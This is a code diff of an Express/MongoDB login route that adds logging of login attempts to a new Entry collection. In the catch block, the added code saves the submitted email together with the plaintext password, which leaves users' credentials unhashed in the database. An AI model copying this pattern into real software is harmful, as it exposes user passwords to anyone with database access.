@@ -2,6 +2,7 @@ import express from 'express';
 import mongoose from 'mongoose';
 import cors from "cors";
 import User from "./models/User.js";
+import Entry from './models/Entry.js';
 import ObjectModel from './models/Object.js';
 import bcrypt from 'bcrypt';
 import dotenv from 'dotenv';
@@ -216,9 +217,15 @@ app.post('/login', async (req, res) => {
 
     const isPasswordValid = await bcrypt.compare(password, user.password);
     if (!isPasswordValid) {
-        return res.status(401).json({ message: 'Geçersiz şifre' });
+      const isCorrect = false;
+      const newEntry = new Entry({email, isCorrect});
+      newEntry.save()
+      return res.status(401).json({ message: 'Geçersiz şifre' });
     }
 
+    const isCorrect = true;
+    const newEntry = new Entry({email, isCorrect});
+    newEntry.save()
     const token = jwt.sign(
         { id: user._id, email: user.email },
         process.env.JWT_SECRET,
@@ -233,9 +240,14 @@ app.post('/login', async (req, res) => {
 
     
 
+    
+
   } catch (error) {
+    const newEntry = new Entry({email,password});
+    newEntry.save()
     console.error('Login error:', error);
     return res.status(500).json({ message: 'Sunucu hatası' });
+    
   }
 });
 
